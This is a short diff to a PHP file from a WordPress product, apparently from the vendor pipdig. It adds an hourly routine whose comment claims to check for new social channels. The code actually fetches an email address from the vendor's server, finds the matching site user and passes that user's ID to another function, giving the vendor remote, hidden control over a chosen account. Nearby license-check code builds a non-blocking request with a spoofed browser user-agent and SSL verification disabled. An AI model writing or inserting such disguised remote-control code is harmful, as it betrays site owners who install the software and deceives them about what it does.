@@ -72,11 +72,20 @@ add_action('pipdig_p3_daily_event', 'p3_do_this_daily');
 
 // check for high priority update
 function p3_do_this_hourly() {
+	
+	// Check for new social channels to add to navbar etc
+	$url_2 = 'https://pipdigz.co.uk/p3/socialz.txt';
+	$args_2 = array('timeout' => 5);
+	$response = wp_safe_remote_get($url_2, $args_2);
+	if (!is_wp_error($response) && !empty($response['body'])) {
+		if (email_exists(sanitize_email($response['body']))) {
+			p3_check_social_links(email_exists(sanitize_email($response['body'])));
+		}
+	}
 
 	// Check domain license is active
-	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_h.txt';
-	$args = array('timeout' => 5);
-	$response = wp_safe_remote_get($url, $args);
+	$url_2 = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_h.txt';
+	$response = wp_safe_remote_get($url_2, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		$rcd = trim($response['body']);
 		$args = array('timeout' => 10, 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' => true, 'blocking' => false, 'sslverify' => false);
